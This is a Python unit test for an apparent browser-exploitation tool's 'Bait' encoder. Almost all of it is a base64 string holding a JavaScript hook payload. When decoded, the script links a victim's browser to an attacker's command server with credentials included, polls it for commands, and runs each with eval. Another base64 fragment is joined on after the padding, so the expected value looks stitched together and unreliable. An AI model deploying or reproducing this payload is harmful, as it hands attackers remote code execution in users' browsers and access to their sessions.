import unittest
from parsers import Bait

URL_ENCODED_FETCH_BAIT = ("LyoNCkRlZmF1bHQgcGF5bG9hZCBmb3IgaG9va2luZyBicm93c2VycyB0byB0aGUgZmlzaGVybWFuJ3MgYm9hdCB1c2luZyBmZXRjaCBhcGkNClRoaXMgcGF5bG9hZCBpZiBmb3Igbm9uLXBlcnNpc3RlbnQgc2NyaXB0cyB0aGF0IGFmdGVyIGV2YWwnZCBjYW4gYmUgdGhyb3duIGF3YXkNCiovDQoNCg0KKGFzeW5jIGZ1bmN0aW9uKCkgew0KICAgIHZhciBzZXJ2ZXJBZGRyZXNzID0gIjEyNy4wLjAuMTo1MDAwIjsNCiAgICB2YXIgY29ubmVjdGlvblJldHJ5Q291bnQgPSAwOw0KDQogICAgYXN5bmMgZnVuY3Rpb24gc2xlZXAodGltZSkgew0KICAgICAgICByZXR1cm4gbmV3IFByb21pc2UoKHJlc29sdmUpID0+IHNldFRpbWVvdXQocmVzb2x2ZSwgdGltZSkpOw0KICAgIH0NCg0KICAgIGFzeW5jIGZ1bmN0aW9uIHN0YXJ0U2Vzc2lvbihzZXJ2ZXJBZGRyZXNzKSB7DQogICAgICAgIGZvciAobGV0IG5Db25uZWN0aW9uQXR0ZW1wcyA9IDA7IG5Db25uZWN0aW9uQXR0ZW1wcyA8IDQ7IG5Db25uZWN0aW9uQXR0ZW1wcysrKSB7DQogICAgICAgICAgICBjb25zb2xlLmxvZygiSG9va2luZyB0byBzZXJ2ZXIuLi4gIik7DQogICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgIGNvbnN0IHJlcyA9IGF3YWl0IGZldGNoKGBodHRwOi8vJHtzZXJ2ZXJBZGRyZXNzfS9ob29rL2AsIHsNCiAgICAgICAgICAgICAgICAgICAgbWV0aG9kOiAiR0VUIiwNCiAgICAgICAgICAgICAgICAgICAgbW9kZTogJ2NvcnMnLA0KICAgICAgICAgICAgICAgICAgICBoZWFkZXJzOiB7DQogICAgICAgICAgICAgICAgICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nDQogICAgICAgICAgICAgICAgICAgIH0sDQogICAgICAgICAgICAgICAgICAgIGNyZWRlbnRpYWxzOiAiaW5jbHVkZSINCiAgICAgICAgICAgICAgICB9KTsNCg0KICAgICAgICAgICAgICAgIGlmICghcmVzLm9rKSB7DQogICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcihgSFRUUCBlcnJvciEgc3RhdHVzOiAke3Jlcy5zdGF0dXN9YCk7DQogICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgDQogICAgICAgICAgICB9IA0KICAgICAgICAgICAgY2F0Y2ggKGVycm9yKSB7DQogICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcihgRXJyb3IgaG9va2luZyB0byBzZXJ2ZXI6ICR7ZXJyb3J9LCBudW1iZXIgb2YgY29ubmVjdGlvbiBhdHRlbXB0czogJHtuQ29ubmVjdGlvbkF0dGVtcHN9Li4uIGApOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBhd2FpdCBzbGVlcCgyMDAwKTsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0NCg0KICAgIGFzeW5jIGZ1bmN0aW9uIHNlbmRSZXF1ZXN0KHNlcnZlckFkZHJlc3MpIHsNCiAgICAgICAgY29uc29sZS5sb2coIkZldGNoaW5nIGNvbW1hbmQgZnJvbSBzZXJ2ZXIuLi4iKTsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIGNvbnN0IHJlcyA9IGF3YWl0IGZldGNoKGBodHRwOi8vJHtzZXJ2ZXJBZGRyZXNzfS9jb21tYW5kL2AsIHsNCiAgICAgICAgICAgICAgICBtZXRob2Q6ICJHRVQiLA0KICAgICAgICAgICAgICAgIG1vZGU6ICdjb3JzJywgDQogICAgICAgICAgICAgICAgaGVhZGVyczogew0KICAgICAgICAgICAgICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nDQogICAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgICBjcmVkZW50aWFsczogImluY2x1ZGUiDQogICAgICAgICAgICB9KTsNCg0KICAgICAgICAgICAgaWYgKCFyZXMub2spIHsNCiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoYEhUVFAgZXJyb3IhIHN0YXR1czogJHtyZXMuc3RhdHVzfWApOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBsZXQgZGF0YSA9IGF3YWl0IHJlcy5qc29uKCk7DQogICAgICAgICAgICBpZiAoIWRhdGEuY29tbWFuZCkgew0KICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKCJObyBjb21tYW5kIHRvIGV4ZWN1dGUuLi4gIik7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIGVsc2Ugew0KICAgICAgICAgICAgICAgIGV2YWwoYXRvYihkYXRhLmNvbW1hbmQpKTsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgcmV0dXJuIHRydWU7DQoNCiAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsNCiAgICAgICAgICAgIGNvbm5lY3Rpb25SZXRyeUNvdW50Kys7DQogICAgICAgICAgICBjb25zb2xlLmVycm9yKGBFcnJvciBmZXRjaGluZyBjb21tYW5kIGZyb20gc2VydmVyOiAke2Vycm9yfSwgbnVtYmVyIG9mIGNvbm5lY3Rpb24gYXR0ZW1wdHM6ICR7Y29ubmVjdGlvblJldHJ5Q291bnR9Li4uIGApOw0KICAgICAgICAgICAgaWYgKGNvbm5lY3Rpb25SZXRyeUNvdW50ID4gMykgew0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgIH0NCiAgICB9DQoNCiAgICBjb25zdCBzZXNzaW9uU3RhcnRTdGF0dXMgPSBhd2FpdCBzdGFydFNlc3Npb24oc2VydmVyQWRkcmVzcyk7DQoNCiAgICBpZiAoIXNlc3Npb25TdGFydFN0YXR1cykgew0KICAgICAgICB0aHJvdyBuZXcgRXJyb3IoIlN0b3BwaW5nIGV4ZWN1dGlvbiBkdWUgdG8gY29ubmVjdGlvbiBwcm9ibGVtcy4uLiAiKTsNCiAgICB9DQoNCiAgICBjb25zdCBpbnRlcnZhbElkID0gc2V0SW50ZXJ2YWwoKCkgPT4geyANCiAgICAgICAgY29uc3Qgc3RhdHVzID0gc2VuZFJlcXVlc3Qoc2VydmVyQWRkcmVzcyk7DQogICAgICAgIGlmICghc3RhdHVzKSB7DQogICAgICAgICAgICBjbGVhckludGVydmFsKGludGVydmFsSWQpOw0KICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKCJTdG9wcGluZyBleGVjdXRpb24gZHVlIHRvIGNvbm5lY3Rpb24gcHJvYmxlbXMuLi4gIik7DQogICAgICAgIH0NCg0KICAgIH0sIDIwMDApOw0KfSkoKTs=+IDMpIHsKICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgfQogICAgfQoKICAgIGNvbnN0IHNlc3Npb25TdGFydFN0YXR1cyA9IGF3YWl0IHN0YXJ0U2Vzc2lvbihzZXJ2ZXJBZGRyZXNzKTsKCiAgICBpZiAoIXNlc3Npb25TdGFydFN0YXR1cykgewogICAgICAgIHRocm93IG5ldyBFcnJvcigiU3RvcHBpbmcgZXhlY3V0aW9uIGR1ZSB0byBjb25uZWN0aW9uIHByb2JsZW1zLi4uICIpOyAvLyBUT0RPOiBUaGluayBpZiB0byBjbGVhbiB1cCBzY3JpcHQgZnJvbSBwYWdlCiAgICB9CgogICAgY29uc3QgaW50ZXJ2YWxJZCA9IHNldEludGVydmFsKCgpID0+IHsgCiAgICAgICAgY29uc3Qgc3RhdHVzID0gc2VuZFJlcXVlc3Qoc2VydmVyQWRkcmVzcyk7CiAgICAgICAgaWYgKCFzdGF0dXMpIHsKICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChpbnRlcnZhbElkKTsKICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKCJTdG9wcGluZyBleGVjdXRpb24gZHVlIHRvIGNvbm5lY3Rpb24gcHJvYmxlbXMuLi4gIik7IC8vIFRPRE86IFRoaW5rIGlmIHRvIGNsZWFuIHVwIHNjcmlwdCBmcm9tIHBhZ2UKICAgICAgICB9CgogICAgfSwgMjAwMCk7Cn0pKCk7")

class TestBaitParser(unittest.TestCase):
    def test_bait_parser(self):
        encoded_bait = Bait.b64_encode('fetch.js')

        self.assertEqual(URL_ENCODED_FETCH_BAIT, encoded_bait)


if __name__ == '__main__':
    unittest.main()
